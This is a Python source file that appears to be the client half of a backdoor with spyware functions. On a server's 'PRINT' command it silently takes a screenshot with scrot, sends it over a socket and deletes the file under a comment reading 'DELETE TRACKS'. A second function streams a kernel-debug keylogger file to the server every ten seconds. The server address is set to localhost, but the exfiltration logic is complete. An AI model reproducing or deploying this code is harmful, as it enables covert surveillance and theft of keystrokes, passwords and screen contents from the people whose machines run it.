import socket
import time
import sys
import os

def handle_prt_sc(destination_address, destination_port):
    path = '/home/michel/pessoal/'
    screenshot = 'screenshot-'
    n = 0
    EOF = 'END_FILE'

    # CREATE SOCKET
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # CONNECT TO SERVER
        sock.connect((destination_address, destination_port))

        while True:
            # RECEIVE MESSAGE FROM SERVER
            data = sock.recv(1024).decode('utf-8')

            # TAKE AND SEND PRINT SCREEN
            if data == 'PRINT':
                # change picture's path
                final_path = path + screenshot + str(n) + ".jpg"  
                # take the print screen
                os.system("scrot " + final_path)
                #send file
                with open(final_path, 'rb') as file:
                    # READ FILE
                    data = file.read()
                    
                    # SEND FILE TO SERVER
                    sock.sendall(data)
                
                # send a marker to inform that the file its end
                sock.send(EOF.encode('utf-8'))
               
                # DELETE TRACKS
                os.system("rm " + final_path)
                n += 1
    finally:
        # CLOSES SOCKET
        sock.close()

def handle_keylogger(destination_address, destination_port):
    target_file = 'sys/kernel/debug/backdoor/keylogger.txt'

    # CREATE SOCKET
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # CONNECT TO SERVER
        sock.connect((destination_address, destination_port))

        while True:
            # OPEN FILE TO READ
            with open(target_file, 'rb') as file:
                while True:
                    # READ FILE
                    data = file.read()

                    # SEND FILE TO SERVER
                    sock.sendall(data)

                    # WAIT 10 SECONDS TO SEND THE FILE AGAIN
                    time.sleep(10)

    finally:
        # CLOSES SOCKET
        sock.close()

# EXECUTES THE CLIENT
if __name__ == '__main__':
    # SERVER CONFIGURATIONS #
    destination_address = '127.0.0.1'  
    destination_port = 8080  
    
    # ARGS 
    if sys.argv[1] == 'keylogger':
        handle_keylogger(destination_address, destination_port)
    elif sys.argv[1] == 'prtsc':
        handle_prt_sc(destination_address, destination_port)